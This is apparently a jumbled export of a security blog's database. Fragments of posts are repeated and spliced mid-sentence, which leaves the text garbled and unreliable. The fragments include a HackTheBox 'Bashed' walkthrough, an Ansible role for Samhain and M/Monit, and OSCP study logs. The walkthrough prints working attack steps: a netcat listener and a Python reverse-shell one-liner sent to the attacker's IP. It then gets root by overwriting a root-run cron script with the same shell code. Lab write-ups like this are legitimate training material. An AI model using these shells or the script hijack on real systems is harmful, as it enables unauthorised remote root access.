If I can replace ```test.py``` with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!\\n\\n# Privilege Escalation\\n\\n```\\nscriptmanager@bashed:/scripts$ mv test.py old-test.py\\nscriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"<my HTB IP address>\\\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' > test.py\\n```\\n\\nHere I moved/renamed the existing ```test.py``` and created my own with the reverse shell code. This isn't necessary, you could just add the reverse shell bits to the end of the existing file.\\n\\nAgain note the \\\"my HTB IP address field\\\" and port number. I want a second reverse shell that's separate from the one I'm currently working in, so I selected a new port (5555).\\n\\nI'm not exactly sure how or when root executes the ```test.py``` script.  Given the autonomous nature of these HTB systems I assume it's just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.\\n\\nAfter a few minutes...\\n\\n![94582eeb-e301-49ba-9bf2-64769b24438c](/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png)\\n\\n**root = owned**\\n\\n# Conclusion\\nLooking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:\\n\\n1. Look at the simple or obvious things first.  Don't assume every target is going to require some elaborate, complicated method to exploit.\\n2. Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <code>test.txt</code> and <code>test.py</code>\\n\\nDid you conquer Bashed using some other method?  Feel free to reach out to me on [Twitter](https://twitter.com/aj_mcquay), I'd love to talk about it.\"}]],\"markups\":[],\"sections\":[[10,0]]}","created_at_ts":1551111376341,"created_at":"2019-02-25T16:16:16.000Z"},{"id":"5c8098922ac21c1cf0c27ea9","post_id":"5c7feb8f2ac21c1cf0c27e7c","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"I'm an infosec professional with a background in networking (routing & switching, DSL/WAN) and Linux administration.

use several tools for various security or compliance controls on production Linux servers. Some of those aren't automatically installed/maintained through our package management utility, and with 100+ machines it is far too time-consuming to manually deal with each one. I've started experimenting with Ansible to simplify this and thought I'd share the first role I've written while I'm learning.\\n\\n## Identify Tools and Required Tasks\\nThe first step was to identify what tools I wanted the playbook to manage, and what steps I take to install and configure them. Two tools I use that aren't managed by Spacewalk are Samhain and M/Monit.\\n### Samhain\\nWe currently deploy Samhain in a simple standalone fashion that logs locally, then those logs get picked up by our SIEM. I download and compile Samhain from source but don't use a ton of options at compile time as we aren't currently running a Yule server. That means the required tasks are pretty simple:\\n\\n* Download Samhain\\n* Extract & verify PGP signature\\n* Configure, compile, install\\n* Copy in preferred config\\n* Initialize or re-initialize file signature database\\n* Start the daemon\\n\\nI opted to split these steps into two tasks named install and update.\\n### M/Monit\\nM/Monit is just a centralized dashboard used to manage multiple instances of the Linux utility monit. Setting this up just requires customizing the monit configuration file with M/Monit server details and any custom services you want to manage. The tasks here include:\\n\\n* Make sure monit is installed\\n* Backup current/default monitrc\\n* Install new monitrc from template\\n* Start or restart the service\\n## Create Ansible role structure\\nNow it's time to create the folder hierarchy for our Ansible job. When using roles, Ansible expects certain files to exist in specific directories and will automatically pull in your variable files, handlers, templates, etc. If you're unfamiliar, read up on roles here.\\n\\nHere's my file/folder structure:\\n```nix\\nansible/security-tools/\\n├── ansible.cfg\\n├── inventories\\n│   └── production\\n│       └── hosts\\n├── main.yml\\n└── roles\\n    ├── monit\\n    │   ├── files\\n    │   ├── handlers\\n    │   │   └── main.yml\\n    │   ├── tasks\\n    │   │   └── main.yml\\n    │   ├── templates\\n    │   │   └── monitrc.j2\\n    │   └── vars\\n    │       └── main.yml\\n    └── samhain\\n        ├── files\\n        │   └── samhainrc\\n        ├── handlers\\n        ├── tasks\\n        │   ├── install.yml\\n        │   ├── main.yml\\n        │   └── update.yml\\n        ├── templates\\n        └── vars\\n            └── main.yml\\n```\\nThe primary playbook is executed by running the command ansible-playbook main.yml. Here's what it looks like:\\n```yaml\\n---\\n- hosts: all\\n  become: yes\\n  roles:\\n    - {name: samhain, tags: samhain}\\n    - {name: monit, tags: monit}\\n```\\nPretty simple, right? I added tags so that I can pick and choose which roles I want to run as this project expands. For example I can run just the monit role with the command `ansible-playbook main.yml --tags monit`.\\n## Roles in Detail\\n### Monit\\nLet's take a closer look at each role now, starting with Monit. Here's the roles/monit/tasks/main.yml task file:\\n```yaml\\n---\\n - stat: path={{ monitrc_path }}\\n   register: rc\\n\\n - name: install monit on CentOS hosts\\n   yum:\\n     name: monit\\n     state: present\\n   when: ansible_distribution == \\\"CentOS\\\" and ansible_distribution_major_version > '5'\\n\\n - name: install monit on Ubuntu hosts\\n   apt:\\n     name: monit\\n     state: present\\n   when: ansible_distribution != \\\"CentOS\\\"\\n\\n - name: backup current monitrc file\\n   command: mv {{ monitrc_path }} /etc/monitrc.bak\\n   when: rc.stat.exists\\n\\n - name: write new monitrc file and restart the service\\n   template:\\n     src: monitrc.j2\\n     dest: \\\"{{ monitrc_path }}\\\"\\n     owner: root\\n     mode: 0600\\n   notify:\\n     - stop monit service\\n     - start monit service\\n``` \\nYou can see it referencing the variable `{{ monitrc_path }}`, template file `monitrc.j2`, and handlers `stop monit service` and `start monit service`. Ansible automatically pulls these in from `roles/monit/vars/main.yml`, `roles/monit/templates/`, and `roles/monit/handlers/main.yml`, respectively.\\n\\nThe vars file contains a single line: `monitrc_path: /etc/monitrc`\\n\\nI won't attach the entire monitrc template, but it just substitutes a single variable from the facts Ansible gathers on each host when first running a playbook. Example:\\n```nix\\nset httpd port 2812 and\\n    use address {{ ansible_default_ipv4.address }}\\n```\\nFinally, `roles/monit/handlers/main.yml` contains:\\n```yaml\\n---\\n- name: stop monit service\\n  service:\\n    name: monit\\n    state: stopped\\n- name: start monit service\\n  command: monit -c /etc/monitrc\\n```\\n### Samhain\\nNow for a quicker look at the Samhain role. Here are the contents of roles/samhain/tasks/main.yml:\\n```yaml\\n---\\n- include: install.yml\\n- include: update.yml\\n```\\nThis simply calls the separate install and update tasks. I typically comment one of them out and just run install if it's a new system needing security tools installed the first time, or update if it's an existing system that just needs an update to the samhain config file.\\n\\nInstall task:\\n```yaml\\n---\\n- stat: path={{ samhain_database }}\\n  register: sam_db\\n- stat: path={{ samhainrc_path }}\\n  register: sam_path\\n- stat: path={{ samhain_process }}\\n  register: samhain_pid\\n- name: Download Samhain package\\n  get_url:\\n    url: http://www.la-samhna.de/samhain/samhain-current.tar.gz\\n    dest: /opt\\n    checksum: <insert checksum for current version of Samhain>\\n- name: Unpack Samhain tarball\\n  unarchive:\\n    src: /opt/samhain-current.tar.gz\\n    dest: /opt/\\n    remote_src: True\\n- name: Import Samhain development key\\n  command: gpg --keyserver pgp.key-server.io --recv-key 0F571F6C\\n- name: Check key fingerprint\\n  command: gpg --fingerprint 0F571F6C\\n- name: Verify PGP signature\\n  shell: gpg --verify /opt/samhain-{{ samhain_version }}.tar.gz.asc /opt/samhain-{{ samhain_version }}.tar.gz\\n  register: gpg_check\\n- debug: msg={{gpg_check}}\\n- name: Unzip second-stage tar file\\n  unarchive:\\n    src: /opt/samhain-{{ samhain_version }}.tar.gz\\n    dest: /opt\\n    remote_src: True\\n- name: Install Samhain\\n  shell: cd /opt/samhain-{{ samhain_version }} && ./configure && make && make install\\n  args:\\n    creates: /etc/samhainrc\\n```\\nUpdate task:\\n```yaml\\n---\\n- stat: path={{ samhain_database }}\\n  register: db\\n- stat: path={{ samhainrc_path }}\\n  register: rc\\n- stat: path={{ samhain_process }}\\n  register: pid\\n- name: Stop samhain process\\n  command: /usr/local/sbin/samhain stop\\n  when: pid.stat.exists\\n- name: Copy samhainrc file to client\\n  copy: src=samhainrc dest=/tmp/samhainrc\\n    owner=root group=root mode=0644\\n- name: Backup current samhainrc\\n  command: mv {{ samhainrc_path }} /etc/samhainrc.bak\\n  when: rc.stat.exists\\n- name: Move samhainrc to /etc\\n  command: mv /tmp/samhainrc {{ samhainrc_path }}\\n- name: Backup existing samhain database\\n  command: mv {{ samhain_database }} /var/lib/samhain/samhain_file.bak\\n  when: db.stat.exists\\n- name: Update samhain database\\n  command: /usr/local/sbin/samhain -t init\\n- name: Start samhain\\n  command: /usr/local/sbin/samhain -D -t check\\n```\\nThe file referenced in the copy operation is located at roles/samhain/files/samhainrc.\\n\\nVars file:\\n```yaml\\n    samhain_database: /var/lib/samhain/samhain_file\\n    samhainrc_path: /etc/samhainrc\\n    samhain_process: /var/run/samhain.pid\\n    samhain_version: <insert current Samhain version>\\n```   \\n   \\nConclusion\\n\\nThis is all fairly simple but has greatly reduced the amount of time I spend installing and maintaining these tools.

The best way to learn is by doing, and one of my favorite ways to practice is [HackTheBox](https://hackthebox.eu).\\n\\nThe machine named *Bashed* was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.\\n\\n# Recon\\nAs usual with a HackTheBox target system, all you have at the onset is a name and IP address. My starting point is usually an nmap scan against the target machine's IP.\\n\\n```\\nnmap -sC -sV -oA nmap 10.10.10.68\\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST\\nNmap scan report for 10.10.10.68\\nHost is up (0.17s latency).\\nNot shown: 999 closed ports\\nPORT   STATE SERVICE VERSION\\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\\n|_http-server-header: Apache/2.4.18 (Ubuntu)\\n|_http-title: Arrexel's Development Site\\nService detection performed.

There are several options for investigating further, but before opening a web browser I continued with nmap and ran the http-enum script.\\n\\n```\\nnmap --script http-enum 10.10.10.68\\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:07 EST\\nNmap scan report for 10.10.10.68\\nHost is up (0.17s latency).\\nNot shown: 999 closed ports\\nPORT   STATE SERVICE\\n80/tcp open  http\\n| http-enum:\\n|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\\n|_  /uploads/: Potentially interesting folder\\nNmap done: 1 IP address (1 host up) scanned in 46.16 seconds\\n```\\n\\nThe /dev directory contains a couple of scripts.  Visiting http://10.10.10.68/dev/phpbash.php in a browser presented me with a web shell (!).  I'm able to navigate the file structure and read the contents of /home.  Getting user.txt is a simple exercise at this point.\\n\\n![bashed_user](/content/images/2018/05/bashed_user.png)\\n\\n**user = owned**\\n\\n# Gaining a Foothold\\n\\nI need to get a \\\"real\\\" shell on the box to go any further. I choose one of my favorite reverse shell one-liners and see if it will work from the PHP web shell.\\n\\nFirst, I'll need a listener on my local attacker machine:\\n\\n```\\nnc -v -n -l -p 4444\\n```\\n\\nNow I drop this python script directly in the web shell.  The ampersand (&) at the end just backgrounds the process.\\n```\\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"<my HTB IP address>\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' &\\n```\\n\\nNote that the field \\\"my HTB IP address\\\" would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I'm connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.\\n    \\n![bashed_revshell1](/content/images/2018/05/bashed_revshell1.png)\\n    \\nNow I have a reverse shell on the target system, but it's still limited. I try using python again to escape to a bash shell.\\n\\n```\\npython -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\\n```\\n![bashed_revshell2](/content/images/2018/05/bashed_revshell2.png)\\n\\nGreat, now I'm at a more typical shell as user www-data.  Time to enumerate.\\n\\n# Enumeration\\n\\nI checked many many things, but looking at sudo capabilities turned up some useful information.\\n\\n```\\nwww-data@bashed:/var/www/html/dev$ sudo -l\\nsudo -l\\nMatching Defaults entries for www-data on bashed:\\n    env_reset, mail_badpass,\\n    secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin\\nUser www-data may run the following commands on bashed:\\n    (scriptmanager : scriptmanager) NOPASSWD: ALL\\n```\\n\\nSo, my current user (www-data) can run ALL commands as user scriptmanager with no password? I decide to try becoming scriptmanager.\\n\\n```\\nwww-data@bashed:/var/www/html/dev$ sudo -i -u scriptmanager\\nsudo -i -u scriptmanager\\nscriptmanager@bashed:~$\\n```\\n\\nFrom the [sudo man page](https://www.sudo.ws/man/1.8.3/sudo.man.html):\\n\\n> -i [command]\\n> The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell's -c option. ==If no command is specified, an interactive shell is executed.== sudo attempts to change to that user's home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use.\\n\\nBingo, now I'm scriptmanager.  More enumeration.\\n\\n```\\nscriptmanager@bashed:/var/www/html/dev$ ls -l /\\nls -l /\\ntotal 80\\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:22 bin\\ndrwxr-xr-x   3 root          root           4096 Dec  4 11:17 boot\\ndrwxr-xr-x  19 root          root           4240 Jan 12 20:25 dev\\ndrwxr-xr-x  89 root          root           4096 Dec  4 17:09 etc\\ndrwxr-xr-x   4 root          root           4096 Dec  4 13:53 home\\nlrwxrwxrwx   1 root          root             32 Dec  4 11:14 initrd.img -> boot/initrd.img-4.4.0-62-generic\\ndrwxr-xr-x  19 root          root           4096 Dec  4 11:16 lib\\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:13 lib64\\ndrwx------   2 root          root          16384 Dec  4 11:13 lost+found\\ndrwxr-xr-x   4 root          root           4096 Dec  4 11:13 media\\ndrwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt\\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:18 opt\\ndr-xr-xr-x 122 root          root              0 Jan 12 20:24 proc\\ndrwx------   3 root          root           4096 Dec  4 13:03 root\\ndrwxr-xr-x  18 root          root            500 Jan 12 20:25 run\\ndrwxr-xr-x   2 root          root           4096 Dec  4 11:18 sbin\\ndrwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4 18:06 scripts\\ndrwxr-xr-x   2 root          root           4096 Feb 15  2017 srv\\ndr-xr-xr-x  13 root          root              0 Jan 12 20:24 sys\\ndrwxrwxrwt  10 root          root           4096 Jan 12 21:07 tmp\\ndrwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr\\ndrwxr-xr-x  12 root          root           4096 Dec  4 11:20 var\\nlrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -> boot/vmlinuz-4.4.0-62-generic\\n```\\n\\nStrange, ```scripts``` isn't a typical top-level directory and it's owned by scriptmanager. I move into the directory and investigate further.\\n\\n```\\nscriptmanager@bashed:/scripts$ ls -al\\nls -al\\ntotal 16\\ndrwxrwxr--  2 scriptmanager scriptmanager 4096 Apr 20 08:14 .\\ndrwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..\\n-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4 17:03 test.py\\n-rw-r--r--  1 root          root            12 Apr 20 08:18 test.txt\\n```\\n\\nExamining these two files leads me to believe that ```test.txt``` containts output from the ```test.py``` script.  However,```test.txt``` is owned by root while the directory it resides in and the ```test.py``` script that generates it are owned by scriptmanager.\\n\\nThis implies that root is executing the script as itself, so the output is written with root ownership. If I can replace ```test.py``` with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!\\n\\n# Privilege Escalation\\n\\n```\\nscriptmanager@bashed:/scripts$ mv test.py old-test.py\\nscriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"<my HTB IP address>\\\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' > test.py\\n```\\n\\nHere I moved/renamed the existing ```test.py``` and created my own with the reverse shell code. This isn't necessary, you could just add the reverse shell bits to the end of the existing file.\\n\\nAgain note the \\\"my HTB IP address field\\\" and port number. I want a second reverse shell that's separate from the one I'm currently working in, so I selected a new port (5555).\\n\\nI'm not exactly sure how or when root executes the ```test.py``` script.  Given the autonomous nature of these HTB systems I assume it's just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.\\n\\nAfter a few minutes...\\n\\n![94582eeb-e301-49ba-9bf2-64769b24438c](/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png)\\n\\n**root = owned**\\n\\n# Conclusion\\nLooking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:\\n\\n1. Look at the simple or obvious things first.  Don't assume every target is going to require some elaborate, complicated method to exploit.\\n2. Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <code>test.txt</code> and <code>test.py</code>\\n\\nDid you conquer Bashed using some other method?

The best way to learn is by\ndoing, and one of my favorite ways to practice is HackTheBox\n[https://hackthebox.eu].\n\nThe machine named Bashed  was recently retired so walkthroughs for it have been\npopping up everywhere. This one is mine.\n\nRecon\nAs usual with a HackTheBox target system, all you have at the onset is a name\nand IP address. My starting point is usually an nmap scan against the target\nmachine's IP.\n\nnmap -sC -sV -oA nmap 10.10.10.68\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST\nNmap scan report for 10.10.10.68\nHost is up (0.17s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Arrexel's Development Site\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.71 seconds\n\n\nOk, TCP 80 / HTTP is listening. There are several options for investigating\nfurther, but before opening a web browser I continued with nmap and ran the\nhttp-enum script.\n\nnmap --script http-enum 10.10.10.68\nStarting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:07 EST\nNmap scan report for 10.10.10.68\nHost is up (0.17s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum:\n|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'\n|_  /uploads/: Potentially interesting folder\nNmap done: 1 IP address (1 host up) scanned in 46.16 seconds\n\n\nThe /dev directory contains a couple of scripts. Visiting \nhttp://10.10.10.68/dev/phpbash.php  in a browser presented me with a web shell\n(!). I'm able to navigate the file structure and read the contents of /home.\nGetting user.txt is a simple exercise at this point.\n\n\n\nuser = owned\n\nGaining a Foothold\nI need to get a \"real\" shell on the box to go any further. I choose one of my\nfavorite reverse shell one-liners and see if it will work from the PHP web\nshell.\n\nFirst, I'll need a listener on my local attacker machine:\n\nnc -v -n -l -p 4444\n\n\nNow I drop this python script directly in the web shell. The ampersand (&) at\nthe end just backgrounds the process.\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<my HTB IP address>\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &\n\n\nNote that the field \"my HTB IP address\" would be the 10.10.x.x IP assigned to\nthe VPN interface on my machine (usually tap0 on Kali Linux) when I'm connected\nto the HTB environment, and the port number (4444) is the same one I used to\nstart the netcat listener in the previous step.\n\n\n\nNow I have a reverse shell on the target system, but it's still limited. I try\nusing python again to escape to a bash shell.\n\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n\n\n\nGreat, now I'm at a more typical shell as user www-data.

Again this is all just my opinion.\n\n(ISC)2 CISSP (and specializations), CAP, CSSP, CCSLP\n[https://www.isc2.org/Certifications]\n\nIf #infosec Twitter is any indicator, people either love the CISSP or hate it.

I had initially targeted two other machines, but they both\n   appear to have dependencies on other systems before I can directly compromise\n   them.\n\nI spent 16.5 hours in the lab in week 6, largely because of gh0st.In hindsight\nthat machine wasn't actually that bad once you have a foothold, but you need to\nbe very thorough and methodical in your enumeration.  Are you detecting a theme\nin all of the OSCP tales scattered around the Internet?\n\nMy total time commitment is now up to 85.5 hours. After week 6 I also decided to\nextend my lab time by 30 days (expiring 6/14) and moved my exam date back\nslightly to Monday 6/10.  I've upped my goal of compromised lab machines from 30\nto 40, and also plan to review the buffer overflow section of the course\nmaterial in the week leading up to my test.\n\nOverall I'm feeling confident, but just because I'm learning so much from each\nlab machine.  If I were to take the test today I'm certain I would fail, but I'm\nhoping another six weeks of lab time will have me ready.\n\nPhoto by Kevin Ku\n[https://unsplash.com/photos/w7ZyuGYNpRQ?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText] \n on Unsplash\n[https://unsplash.com/search/photos/hacker?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText]","feature_image":"/content/images/2019/04/kevin-ku-364843-unsplash.jpg","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-04-28T03:54:15.000Z","updated_at":"2019-05-11T20:09:56.000Z","published_at":"2019-04-28T04:19:36.000Z","custom_excerpt":"Recap of my fifth and sixth week in the Offensive Security PWK course.","codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5cd7258f737cc90687ba03a0","uuid":"9bfe71e0-abd6-4073-98b3-78789f4affcd","title":"PWK: Weeks 7 & 8","slug":"pwk-weeks-7-8","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"/content/images/2019/05/week7.png\"}],[\"image\",{\"src\":\"/content/images/2019/05/week8.png\"}]],\"markups\":[[\"em\"],[\"a\",[\"href\",\"https://unsplash.com/photos/kjA82leKmJc?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText\"]],[\"a\",[\"href\",\"https://unsplash.com/search/photos/arizona?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"It's hard to believe I'm already starting my ninth week of the PWK course, it's gone by extremely quickly.

That's 3 of the big 4 down, and 25 hosts toward my goal of\n   30. Primary lesson from this box is that details matter when preparing an\n   exploit. Some bugs need the right environment to thrive. Also started initial\n   discovery of box #26.\n\nDay 62\n * Completed box 26.  Pretty straightforward, I was briefly concerned that the\n   host might not have been in the right state when I started. I just got lucky\n   and chased the right rabbit pretty quickly.  Also started enumeration of host\n   27.\n\nDay 63\n * Did some initial recon against two targets that apparently have major\n   dependencies on other systems.  Decided to switch to another box for target\n   #27, then completed it quickly. I also spent some time cleaning up my\n   documentation a bit.\n\nDay 66\n * Completed target 27. This one taught me to be more thorough in my enumeration\n   (hint, don't just scan TCP ports). Started recon and enumeration of target\n   28.\n\nDay 67\n * Completed #29 in about 15 minutes. Started enumeration against Humble,  which\n   I ceremoniously chose as my 30th target.\n\nDay 69\n * Attempted (and failed) exploitation against Humble. Still haven't obtained a\n   low-privilege shell yet. I need more webapp testing experience.\n\nDay 70\n * Finally got a low-priv shell on Humble. Started enumerating for privesc.\n\nDay 71\n * Identified the path to escalate privileges on Humble and what appears to be\n   the exploit I'll need to use. Did some testing but more is needed.\n\nDay 72\n * Finally completed Humble  and reached my goal of 30 compromised lab machines.\n   I learned a lot here about being detail-oriented with exploit code, and\n   researching how applications I'm unfamiliar with work and are configured to\n   fit all the puzzle pieces together.\n\nDay 73\n * Started working on my lab & exercise report.\n\nDay 74\n * Finished the lab & exercise report.\n\nDay 75\n * I started going through buffer overflow exercises again and making some notes\n   around workflow\n\nDay 76\n * I started and completed host 31 to unlock the Dev subnet. I realized I hadn't\n   unlocked it yet and just wanted to check that box.\n\nThrough week 11 I have invested 130.5 hours into the course and labs. As for\nthis past week (week 12) I have mostly focused on going through buffer overflow\nresources and compiling a reference sheet for things I want to remember during\nthe exam without having to think about them. Command shortcuts, methods to\nconsider in certain situations, etc.\n\nI also plan to write down some 'exam principles' I'd like to stick to, and to\nset up a series of alarms on my phone to remind myself to take breaks, eat, and\nstep away during the exam. Wish me luck, hopefully by this time next week I'll\nofficially be an OSCP!\n\nPhoto by Marvin Ronsdorf\n[https://unsplash.com/@marvin_ronsdorf?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText] \n on Unsplash\n[https://unsplash.com/search/photos/finish?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText]","feature_image":"/content/images/2019/06/marvin-ronsdorf-196913-unsplash.jpg","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-06-07T20:24:52.000Z","updated_at":"2019-06-18T19:42:17.000Z","published_at":"2019-06-07T20:52:17.000Z","custom_excerpt":"Recap of weeks 9, 10, and 11 in my pursuit of the OSCP certification.","codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5d093eb7737cc90687ba04e7","uuid":"6592a0ed-513c-4c96-afae-582707c8fcac","title":"My OSCP experience","slug":"oscp","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"## Exam - Day 1\"}],[\"image\",{\"src\":\"/content/images/2019/06/Screen-Shot-2019-06-20-at-8.59.13-AM.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"## Exam - Day 2\"}],[\"markdown\",{\"markdown\":\"## Looking back - my advice\\n\\n\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"This morning, 7 days after submitting my exam and lab reports, I received an email from Offensive Security letting me know I had successfully completed the OSCP exam.
